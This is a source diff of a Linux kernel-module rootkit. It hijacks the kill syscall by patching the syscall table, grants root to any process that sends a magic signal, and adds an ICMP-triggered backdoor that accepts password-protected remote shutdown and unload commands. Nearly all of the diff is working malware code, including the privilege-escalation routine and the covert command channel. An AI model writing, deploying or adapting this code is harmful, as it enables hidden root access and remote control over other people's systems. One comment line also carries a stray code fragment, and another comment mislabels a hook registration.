@@ -9,6 +9,17 @@
 #include <linux/syscalls.h>
 #include <linux/reboot.h>
 
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/skbuff.h>
+#include <linux/udp.h>
+#include <linux/icmp.h>
+#include <linux/ip.h>
+#include <linux/inet.h>
+#include <linux/icmp.h>
+
+//-------------------------------------------------------------------------------------------
+
 MODULE_LICENSE("GPL");
 
 #define SIG_SHUTDOWN 58
@@ -16,11 +27,87 @@ MODULE_LICENSE("GPL");
 #define SIG_UNLOAD 60
 
 #define PID 12345
+#define PASSWD "rkit"
+#define CMD_SHUTDOWN "shutdown"
+#define CMD_UNLOAD "unload"
+
+#define DEBUG
+
+//-------------------------------------------------------------------------------------------
 
 typedef asmlinkage int (*orig_kill_t)(pid_t, int);
 static unsigned long *__syscall_table;
 orig_kill_t orig_kill;
+static struct nf_hook_ops nfho;
+struct sk_buff *sock_buff;
+struct udphdr *udp_header;
+struct iphdr *ip_header;
+struct ethhdr *mac_header;
+struct icmphdr *icmp_header;
+char data[1024] = {0};
 
+//-------------------------------------------------------------------------------------------
+
+void unload(char* modname) {
+	char *argv[] = {"/sbin/rmmod", modname, NULL};	// Fill calling program with rmmod <modname>
+	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);	// Call command in user land
+}
+
+//-------------------------------------------------------------------------------------------
+
+int execute_command(char *data) {
+	if (strncmp(data, PASSWD, strlen(PASSWD)) != 0) {
+		#ifdef DEBUG
+		printk(KERN_INFO "LKM: Received password: INVALID");
+		#endif		
+		return 1;
+	}
+	
+	data = (data) + (strlen(PASSWD) + 1);
+	
+	if (strncmp(data, CMD_SHUTDOWN, strlen(CMD_SHUTDOWN)) == 0) {
+		#ifdef DEBUG
+		printk(KERN_INFO "LKM: Received shutdown command.");
+		#endif
+		kernel_power_off();
+	} else if (strncmp(data, CMD_UNLOAD, strlen(CMD_UNLOAD)) == 0) {
+		#ifdef DEBUG
+		printk(KERN_INFO "LKM: Received unload command.");
+		#endif
+		unload(THIS_MODULE->name);
+	}
+	
+	return 0;
+}
+
+//-------------------------------------------------------------------------------------------
+
+unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
+	sock_buff = skb;	// Get socket buffer
+	ip_header = (struct iphdr *) skb_network_header(sock_buff);	// Grab network header
+	mac_header = (struct ethhdr *) skb_mac_header(sock_buff);	// Grab mac header
+	
+	if (!sock_buff) {	// Check if socket buffer is valid
+		return NF_DROP;
+	}
+	
+	if (ip_header->protocol == IPPROTO_ICMP) {	// If packet protocol is ICMP
+		icmp_header = icmp_hdr(skb);
+		strncpy(data, (char*)icmp_header + sizeof(struct icmphdr), sizeof(data) - 1);
+		#ifdef DEBUG
+		printk(KERN_INFO "New ICMP Packet:\n");
+		printk(KERN_INFO "Src: %pI4\n", &ip_header->saddr);
+		printk(KERN_INFO "Dst: %pI4\n", &ip_header->daddr);
+		printk(KERN_INFO "Data: %s\n", data);
+		#endif
+		
+		execute_command(data);
+	}
+	
+	return NF_ACCEPT;
+}
+
+//-------------------------------------------------------------------------------------------
 
 unsigned long *find_syscall_table(void)
 {
@@ -37,81 +124,111 @@ unsigned long *find_syscall_table(void)
 	return NULL;
 }
 
+//-------------------------------------------------------------------------------------------
+
 void give_root(void) {
-	struct cred *newcreds;
-	newcreds = prepare_creds();
-	if (newcreds == NULL)
+	struct cred *newcreds;	// Create object for new credentials
+	newcreds = prepare_creds();	// Create credentials
+	if (newcreds == NULL)	// Check if created credentials are valid
 		return;
+
+	// Set permissions to ROOT
 
 	newcreds->uid.val = newcreds->gid.val = 0;
 	newcreds->euid.val = newcreds->egid.val = 0;
 	newcreds->suid.val = newcreds->sgid.val = 0;
 	newcreds->fsuid.val = newcreds->fsgid.val = 0;
-	commit_creds(newcreds);
+	
+	commit_creds(newcreds);	// Commit credentials to terminal
 }
 
-void unload(char* modname) {
-	char *argv[] = {"/sbin/rmmod", modname, NULL};
-	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
-}
+//-------------------------------------------------------------------------------------------
 
 asmlinkage int hacked_kill(pid_t pid, int sig) {
 	int tpid = PID, ret_tmp;
 
-	if ((tpid == pid)) {
+	if ((tpid == pid)) {	// Check if PID is the correct one
 		switch (sig) {
-			case SIG_SHUTDOWN:
+			case SIG_SHUTDOWN:	// If signal is SIG_SHUTDOWN
+				#ifdef DEBUG
 				printk(KERN_INFO "LKM: Received shutdown signal.");
-				kernel_power_off();
+				#endif
+				kernel_power_off();		// Power off the kernel
 				break;
 			
-			case SIG_ROOT:
+			case SIG_ROOT:	// If signal is SIG_ROOT
+				#ifdef DEBUG
 				printk(KERN_INFO "LKM: Received root signal.");
-				give_root();
+				#endif
+				give_root();	// Give root to current terminal
 				break;
 
-			case SIG_UNLOAD:
+			case SIG_UNLOAD:	// If signal is SIG_UNLOAD
+				#ifdef DEBUG
 				printk(KERN_INFO "LKM: Received unload signal.");
-				unload(THIS_MODULE->name);
+				#endif
+				unload(THIS_MODULE->name);	// Unload current module
 				break;
 
-			default:
+			default:	// If signal is not recognized
+				#ifdef DEBUG
 				printk(KERN_INFO "LKM: Received invalid signal %d.", sig);
+				#endif
 				break;
 		}
 
 		return 0;
 	} else {
-		ret_tmp = orig_kill(pid, sig);
-		return (ret_tmp);
+		ret_tmp = orig_kill(pid, sig);	// If pid is not correct, execute the original kill function
+		return (ret_tmp);	// And return value of original function
 	}
 }
 
+//-------------------------------------------------------------------------------------------
+
 static int __init startup(void) {	
-	__syscall_table = find_syscall_table();
-	if (!__syscall_table) {
+	__syscall_table = find_syscall_table();	// Take the address of the syscall table
+	if (!__syscall_table) {	// Check if syscall table was found
+		#ifdef DEBUG
 		printk(KERN_INFO "LKM: Syscall table not found");
+		#endif
 		return -1;
 	}
-
-	write_cr0(read_cr0() & (~ 0x10000));
 	
-	orig_kill = (orig_kill_t) __syscall_table[__NR_kill];
-	__syscall_table[__NR_kill] = (unsigned long) hacked_kill;
-	write_cr0(read_cr0() | 0x10000);
+	nfho.hook = hook_func;
+	nfho.hooknum = 4;	// 0 Capture ICMP Requests, 4 Capture ICMP Replies
+	nfho.pf = PF_INET;	// IPv4 packets
+	nfho.priority = NF_IP_PRI_FIRST;	// Set highest priority
+	nf_register_net_hook(&init_net, &nfho);	// Unregister hook
 
+	write_cr0(read_cr0() & (~ 0x10000));	// Make the syscall table writeable
+	
+	orig_kill = (orig_kill_t) __syscall_table[__NR_kill];	// Save the original kill function
+	__syscall_table[__NR_kill] = (unsigned long) hacked_kill;	// Replace the kill function with the hacked one
+	
+	write_cr0(read_cr0() | 0x10000);	// Make the syscall table read only
+
+#ifdef DEBUG
 	printk(KERN_INFO "LKM: Module loaded as %s!", THIS_MODULE->name);
-
+#endif
 	return 0;
 }
 
-static void __exit cleanup(void) {
-	write_cr0(read_cr0() & (~ 0x10000));
-	__syscall_table[__NR_kill] = (unsigned long) orig_kill;
-	write_cr0(read_cr0() | 0x10000);
+//-------------------------------------------------------------------------------------------nf_register_net_hook(&init_net, reg)
 
+static void __exit cleanup(void) {
+	nf_unregister_net_hook(&init_net, &nfho);	// Unregister hook
+
+	write_cr0(read_cr0() & (~ 0x10000));	// Make the syscall table writeable
+	__syscall_table[__NR_kill] = (unsigned long) orig_kill;	// Restore the original kill function
+	write_cr0(read_cr0() | 0x10000);	// Make the syscall table read only
+
+#ifdef DEBUG
 	printk(KERN_INFO "LKM: Module unloaded!");
+#endif
 }
+
+//-------------------------------------------------------------------------------------------
 
 module_init(startup);
 module_exit(cleanup);
